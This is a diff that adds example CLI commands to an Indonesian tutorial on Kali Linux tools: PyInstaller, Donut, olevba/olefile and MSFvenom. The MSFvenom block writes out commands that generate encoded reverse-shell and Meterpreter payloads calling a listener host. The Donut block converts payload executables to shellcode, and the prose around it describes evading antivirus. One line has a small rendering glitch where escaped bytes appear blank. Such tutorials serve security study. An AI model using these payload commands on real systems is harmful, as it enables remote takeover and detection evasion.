@@ -32,6 +32,18 @@ Secara fungsional, PyInstaller mengeksekusi mekanisme kompilasi dan enkapsulasi 
 * **Manajemen Aset Non-Kode (*Resource Bundling*):** Mengintegrasikan file non-skrip seperti sertifikat SSL, konfigurasi JSON, gambar, atau dokumen teks ke dalam bundel biner, sehingga aplikasi memiliki akses internal ke data pendukung tersebut saat berjalan.
 * **Kompatibilitas Lintas Arsitektur (*Multi-Platform Bootloader*):** Menggunakan *bootloader* terkompilasi berbasis bahasa C untuk menginisialisasi lingkungan *runtime* Python virtual secara cepat tepat sebelum program utama dijalankan, memberikan performa eksekusi tingkat rendah yang stabil.
 
+### Contoh Perintah CLI
+```bash
+# Mengonversi skrip Python menjadi satu file executable mandiri
+pyinstaller --onefile script.py
+
+# Mengonversi menjadi satu file executable tanpa memunculkan jendela konsol (berguna untuk Windows GUI/background)
+pyinstaller --onefile --noconsole script.py
+
+# Menyertakan aset tambahan (misalnya file konfigurasi) ke dalam bundel
+pyinstaller --onefile --add-data "config.json:." script.py
+```
+
 ### Kesimpulan
 Dalam domain akademik dan profesional, PyInstaller di Kali Linux menjembatani fase pengembangan skrip tingkat tinggi (Python) dengan fase eksekusi tingkat sistem (biner). Kemampuannya memaketkan dependensi secara mandiri menjadikannya aset penting dalam penyusunan instrumen keamanan siber, sekaligus menjadi tantangan tersendiri bagi analis forensik yang harus membongkar kembali struktur biner tersebut untuk membaca kode sumber aslinya.
 
@@ -58,6 +70,18 @@ Donut mengimplementasikan serangkaian fungsi rekayasa perangkat lunak tingkat re
 * **Enkripsi dan Kriptografi Muatan:** Secara otomatis menyamarkan *payload* asli menggunakan algoritma enkripsi simetris (seperti `Chacha20`) serta fungsi *hash* (seperti `Marabou` atau `MurmurHash`). Fungsi ini bertujuan memutus jejak pola biner (*signature*) agar tidak terdeteksi oleh sistem inspeksi paket data atau memori.
 * **Mekanisme Dekompresi Terintegrasi:** Menyediakan fitur kompresi opsional menggunakan mesin kompresi (seperti `aPLib` atau `LZMA`) untuk memperkecil ukuran *shellcode* final sebelum dikirimkan melalui jaringan arsitektur C2 (*Command and Control*).
 * **Modularitas Eksekusi Variabel:** Mendukung berbagai metode penargetan fungsi *entry-point*, parameterisasi argumen skrip jarak jauh, serta fleksibilitas arsitektur target baik sistem 32-bit (`x86`) maupun 64-bit (`amd64`).
+
+### Contoh Perintah CLI
+```bash
+# Mengubah file executable (.exe) menjadi shellcode biner mentah untuk arsitektur x64 (amd64)
+donut -i payload.exe -a 2 -o loader.bin
+
+# Mengonversi assembly .NET dengan menentukan class, method, dan parameter argumen
+donut -i Agent.exe -c Namespace.ClassName -m Main -p "arg1 arg2" -o shellcode.bin
+
+# Mengubah VBScript menjadi shellcode dengan format output C array
+donut -i script.vbs -f 3 -o payload.c
+```
 
 ### Kesimpulan
 Secara akademis, Donut memvalidasi pergeseran paradigma taktik serangan siber kontemporer dari eksekusi berbasis berkas fisik (*file-based*) menuju manipulasi memori murni (*fileless/in-memory exploitation*). Kemampuannya memaketkan lingkungan *runtime* kompleks ke dalam untaian biner independen menjadikannya salah satu instrumen paling krusial untuk menguji ketahanan sistem pertahanan memori modern.
@@ -86,6 +110,18 @@ Secara fungsional, Olefile menyediakan API (*Application Programming Interface*)
 * **Deteksi Anomali Kontainer (*Malformation Detection*):** Mampu mengidentifikasi ketidaksesuaian atau korupsi sengaja pada tabel alokasi sektor biner (*FAT/Mini-FAT* internal dokumen) yang sering dimanipulasi oleh pembuat malware untuk membingungkan mesin antivirus statis (*evasion technique*).
 * **Penyaringan Konten Mentah (*Raw Data Stream Extraction*):** Memungkinkan pembacaan biner mentah secara langsung dari *stream* tertentu, sehingga analis dapat memindahkan *shellcode* tersembunyi atau objek OLE yang tertanam (*embedded objects*) ke file eksternal untuk analisis dinamis lebih lanjut.
 
+### Contoh Perintah CLI
+```bash
+# Mengekstrak dan menganalisis kode makro VBA yang tertanam pada dokumen Office menggunakan olevba
+olevba dokumen_mencurigakan.docm
+
+# Menampilkan seluruh kode sumber makro dan melakukan deobfuscation string mencurigakan
+olevba -c --deobf dokumen_mencurigakan.xls
+
+# Menginspeksi struktur internal (storages & streams) serta metadata file OLE menggunakan olefile
+python3 -m olefile dokumen_mencurigakan.doc
+```
+
 ### Kesimpulan
 Secara akademis, Olefile membuktikan bahwa format dokumen biner tradisional merupakan struktur data kompleks yang rentan dimanfaatkan sebagai vektor penyelundupan ancaman (*threat smuggling*). Sebagai pustaka pembedah kontainer, Olefile memfasilitasi transisi dari inspeksi file berbasis visual menjadi inspeksi struktural memori biner, menjadikannya aset fundamental dalam metodologi forensik malware dokumen.
 
@@ -113,6 +149,18 @@ MSFvenom mengeksekusi otomatisasi manipulasi biner tingkat rendah melalui empat 
 * **Eliminasi Karakter Rusak (*Bad Characters Removal*):** Menyediakan argumen filter (opsi `-b`) untuk secara otomatis menghapus karakter *byte* tertentu yang dapat menyebabkan *crash* atau kegagalan eksekusi pada aplikasi target (misalnya *byte* kosong ` ` atau *carriage return* `
 `).
 * **Injeksi dan Hibridisasi Berkas (*Executable Templates*):** Mampu menyuntikkan *shellcode* berbahaya ke dalam aplikasi legal yang sudah ada (misalnya berkas `.exe` atau `.apk` asli) melalui fungsi *template*. Dokumen atau aplikasi sekunder tersebut tetap berfungsi normal secara visual saat dijalankan, sementara muatan internalnya dieksekusi secara latar belakang.
+
+### Contoh Perintah CLI
+```bash
+# Membuat payload Windows Meterpreter Reverse TCP dalam format executable (.exe)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
+
+# Membuat payload Linux Reverse Shell dalam format biner ELF
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
+
+# Menghasilkan shellcode format C dengan eliminasi bad characters dan encoding shikata_ga_nai
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 5 -f c
+```
 
 ### Kesimpulan
 Secara akademis, MSFvenom merepresentasikan standardisasi otomatisasi pembuatan senjata siber (*cyber weaponization*) yang efisien. Perannya yang ganda dalam fase pengembangan sumber daya sekaligus teknik pertahanan berlapis menjadikannya instrumen fundamental untuk memetakan dinamika pertarungan antara rekayasa malware dengan teknologi sistem deteksi modern.
